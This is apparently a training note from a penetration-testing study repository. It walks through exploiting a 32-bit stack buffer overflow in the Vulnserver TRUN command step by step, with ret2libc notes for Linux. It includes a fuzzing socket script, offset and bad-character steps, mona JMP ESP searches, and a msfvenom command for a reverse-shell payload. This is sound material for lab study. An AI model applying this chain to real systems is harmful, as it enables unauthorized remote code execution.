# Buffer overflows and exploit adaptation

[Home](../README.md) · [Managed code and compilation](Managed-Code.md) · [Payload generation](../03-Access/Metasploit.md)

This consolidates the supplied PDF's classic 32-bit stack-overflow exercise. The original offset, module address and shellcode belong to one Vulnserver/TRUN build; derive them again for a different target. This is supplementary practice material, not an assertion about exam objectives.

## Identify the failure and input path

Record architecture, protocol/command prefix, terminator, maximum input, crash behavior and debugger state. Increase input length in a disposable lab until a repeatable crash occurs. Restart the process between tests. A crash alone does not establish instruction-pointer control.

Python 3 networking uses **bytes**, unlike many Python 2 snippets in the PDF:

```python
import socket

target = ("192.0.2.10", 9999)
prefix = b"TRUN /.:/"  # Only for this protocol's vulnerable command.
probe = b"A" * 3000
with socket.create_connection(target, timeout=5) as channel:
    channel.sendall(prefix + probe)
```

A service may need an initial greeting read, authentication or a line terminator. Preserve the exact working request structure.

## Find and prove the offset

**Kali / Bash:**

```bash
msf-pattern_create -l 3000
msf-pattern_offset -l 3000 -q <OBSERVED_EIP_HEX>
```

Send the pattern in the same input position as the crashing buffer. Inspect the actual instruction-pointer value in the debugger, accounting for byte order. Replace the derived offset with `b"A" * offset + b"B" * 4`; verify EIP becomes `42424242` and locate the following buffer in memory. An offset counts bytes from the vulnerable data field, not automatically from the start of the TCP request.

## Test bad characters

Start with the protocol's known terminators (often NUL, CR or LF), then send the remaining byte values after the overwrite. Generate a byte array, compare the received memory and remove the **first confirmed offending byte**, retesting after each change. Truncation can make later bytes appear bad even when only an earlier byte caused the loss. Mona can generate/compare arrays; use its installed help and the real buffer address.

```python
excluded = {0x00}
test_bytes = bytes(value for value in range(256) if value not in excluded)
```

Record transport encoding separately: a form parser, Unicode conversion or line protocol may transform bytes before the vulnerable copy.

## Choose control flow

**Immunity Debugger / Mona examples:**

```text
!mona modules
!mona find -s "\xff\xe4" -m <MATCHING_MODULE.dll>
```

`FF E4` encodes `JMP ESP` for this 32-bit context. Inspect the found instruction, executable memory, module rebasing/ASLR, address bytes and process protections. The source address `0x625011af` is a historical example, not a portable return address. Pack an address explicitly with `struct.pack("<I", address)` for 32-bit little endian.

The classic layout is `padding → return address → optional NOP sled → payload`, provided execution reaches that buffer and it is executable. DEP/NX can require a different path such as ROP; a non-ASLR module alone does not disable DEP. Stack canaries, SafeSEH and other mitigations require their own analysis.

## Generate and validate the final payload

Match architecture, payload space, bad bytes, callback route and handler. Preserve the exact generation command, raw bytes and exploit diff. Example generator from the source family:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 \
  EXITFUNC=thread -a x86 -f python -b '\x00'
```

The exclusion list is an example; use the measured list. Confirm size and repeat the full chain against a fresh process. Capture debugger evidence for offset/control, bad-byte test and final flow, then verify the shell identity. A fresh callback is stronger evidence than a generator's success message.

## Linux binaries and ret2libc

Inspect the binary format, architecture, interpreter, linked libraries and mitigations. GDB/PEDA, `checksec`, `readelf`, `objdump`, `strings`, `ltrace` and `strace` answer different questions; tracing executes the program and may alter SUID behavior. `/proc/sys/kernel/randomize_va_space` typically uses 0 (off), 1 (partial) and 2 (fuller randomization); the PDF omits 2. Do not disable system protections merely to make an unknown exploit work.

The source's “Lib2retc” means **ret2libc**: redirect control to existing library code using a known/derived address and a valid calling convention. On 32-bit x86, stack arguments differ from the register-based x86-64 ABI. Leaks, ASLR, stack alignment and the exact libc build matter. `one_gadget` finds candidate libc offsets with constraints; an offset alone is not a working chain.

## Adaptation record

Keep target package/build, architecture, offsets/addresses, mitigation evidence, bytes/string conversion, dependencies, callback settings, changed lines and observed result. `gcc -m32` needs suitable multilib support; `i686-w64-mingw32-gcc` builds 32-bit Windows code, while `x86_64-w64-mingw32-gcc` builds 64-bit. Linking `-lws2_32` is relevant to Windows Winsock code, not a universal exploit fix.
